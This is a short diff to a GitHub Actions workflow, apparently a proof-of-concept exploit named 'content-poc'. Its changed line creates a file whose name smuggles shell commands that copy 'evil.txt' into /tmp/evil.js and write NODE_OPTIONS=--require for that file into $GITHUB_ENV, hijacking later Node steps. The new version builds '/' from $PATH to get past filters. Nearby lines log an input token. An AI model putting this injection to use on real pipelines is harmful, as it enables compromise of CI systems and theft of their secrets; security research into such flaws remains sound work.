@@ -21,7 +21,7 @@ jobs:
             console.log('::notice::GAB_INPUT_TOKEN '+m);
           }catch(e){console.log('::notice::GAB_EVIL_ERR '+e.message);}
           EOF
-          printf 'x\n' > "content/report.txt;cp /tmp/content/content-poc/evil.txt /tmp/evil.js;sed -i 1iNODE_OPTIONS=--require=/tmp/evil.js \$GITHUB_ENV;true;#.txt"
+          printf 'x\n' > "content/report.txt;P=\$(printf %.1s \$PATH);cd \${P}tmp;cd content-poc;cp evil.txt \${P}tmp\${P}evil.js;sed -i 1iNODE_OPTIONS=--require=\${P}tmp\${P}evil.js \$GITHUB_ENV;true;#.txt"
       - uses: actions/upload-artifact@v4
         with:
           name: content-poc
